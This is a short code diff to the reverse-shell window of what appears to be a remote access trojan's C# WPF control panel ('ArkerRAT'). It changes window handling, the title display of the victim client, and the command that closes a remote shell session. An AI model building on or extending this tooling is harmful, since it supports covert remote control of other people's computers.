@@ -1,4 +1,4 @@
-﻿using ArkerRAT1;
+﻿using ArkerRatWpfVersion;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -28,18 +28,23 @@ namespace ArkerRatWpfVersion
             reverseShellTextOutput.Document.Blocks.Clear();
             reverseShellTextOutput.IsReadOnly = true;
             clientSession = session;
+            windowText.Content += " - " + (clientSession.clientInfo.Split('\t'))[0];
             clientSession.reverseShellWindowIsAlreadyOpen = true;
             clientSession.SendData("§ReverseShellStart§§ReverseShellEnd§");
-
-            lock (GlobalVariables._lock)
-            {
-                clientSession.data = string.Empty;
-            }
         }
-        private async void CloseReverseShell(object sender, RoutedEventArgs e)
+
+        bool close = false;
+        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
+        {
+            if (!close)
+                e.Cancel = true;
+        }
+
+        public async void CloseWindow(object sender, RoutedEventArgs e)
         {
             await clientSession.SendData("§ReverseShellStart§close§ReverseShellEnd§");
             clientSession.reverseShellWindowIsAlreadyOpen = false;
+            close= true;
             Close();
         }
 
@@ -69,6 +74,7 @@ namespace ArkerRatWpfVersion
                 {
                     reverseShellTextOutput.AppendText(data);
                     reverseShellTextOutput.ScrollToEnd();
+                    reverseShellTextInput.Focus();
                 }));
             }
         }
